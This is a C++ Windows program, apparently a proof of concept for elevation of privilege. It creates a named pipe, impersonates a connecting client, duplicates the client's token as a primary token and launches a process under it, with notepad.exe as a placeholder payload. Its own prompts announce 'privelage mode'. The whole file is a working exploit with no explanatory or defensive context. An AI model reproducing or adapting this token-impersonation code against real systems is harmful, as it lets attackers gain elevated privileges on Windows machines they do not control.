#include <iostream>
#include <windows.h>

int main()
{
	auto Pipe = CreateNamedPipe("\\\\.\\pipe\\eop", PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0, 0, 0, nullptr);
	if (Pipe == INVALID_HANDLE_VALUE)
	{
		std::cout << "CreateNamedPipe failed " << GetLastError();
		return 1;
	}

	if (!ConnectNamedPipe(Pipe, nullptr))
	{
		std::cout << "ConnectNamedPipe failed " << GetLastError();
		CloseHandle(Pipe);
		return 1;
	}

	if (!ReadFile(Pipe, nullptr, 0, nullptr, nullptr))
	{
		std::cout << "ReadFile failed " << GetLastError();
		CloseHandle(Pipe);
		return 1;
	}

	char ch;
	STARTUPINFO StartupInfo2 = { sizeof(STARTUPINFO),0 };
	PROCESS_INFORMATION ProcessInfo2;
	if (!CreateProcess("C:\\windows\\notepad.exe", nullptr, nullptr, nullptr, false, 0, nullptr, nullptr, &StartupInfo2, &ProcessInfo2))
	{
		std::cout << "CreateProcess Failed " << GetLastError();
		CloseHandle(Pipe);
		return 1;
	}

	std::cout << "Check impersonation level\n";
	std::cout << "Enter i to impersonate\n";

	std::cin >> ch;
	if (!ImpersonateNamedPipeClient(Pipe))
	{
		std::cout << "ImpersonateNamedPipeClient Failed\n";
		CloseHandle(Pipe);
		return 1;
	}

	HANDLE Token;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &Token))
	{
		std::cout << "OpenThreadToken Failed " << GetLastError();
		CloseHandle(Pipe);
		return 1;
	}

	HANDLE DupToken;
	if (!DuplicateTokenEx(Token,TOKEN_ALL_ACCESS,nullptr, SecurityImpersonation, TokenPrimary, &DupToken))
	{
		std::cout << "DuplicateToken Failed " << GetLastError();
		CloseHandle(Token);
		CloseHandle(Pipe);
		return 1;
	}

	STARTUPINFO StartupInfo = { sizeof(STARTUPINFO),0 };
	PROCESS_INFORMATION ProcessInfo;
	if (!CreateProcessAsUser(DupToken, "C:\\windows\\notepad.exe", nullptr, nullptr, nullptr, false, 0, nullptr, nullptr, &StartupInfo, &ProcessInfo))
	{
		STARTUPINFOW StartupInfo = { sizeof(STARTUPINFOW),0 };
		PROCESS_INFORMATION ProcessInfo;
		std::cout << "CreateProcess Failed. "<<GetLastError();
		std::cout << "\nWill try somethign else!!!\n";

		if (!CreateProcessWithTokenW(DupToken, 0, L"C:\\windows\\notepad.exe", nullptr, 0, nullptr, nullptr, &StartupInfo, &ProcessInfo))
		{
			std::cout << "CreateProcessWithTokenW Failed. " << GetLastError();
			CloseHandle(DupToken);
			CloseHandle(Token);
			CloseHandle(Pipe);
			return 1;
		}
	}

	std::cout << "Check level you should be in privelage mode now\n";
	std::cout << "Enter q to quit\n";
	std::cin >> ch;

	CloseHandle(DupToken);
	CloseHandle(Token);
	CloseHandle(Pipe);

	return 0;
}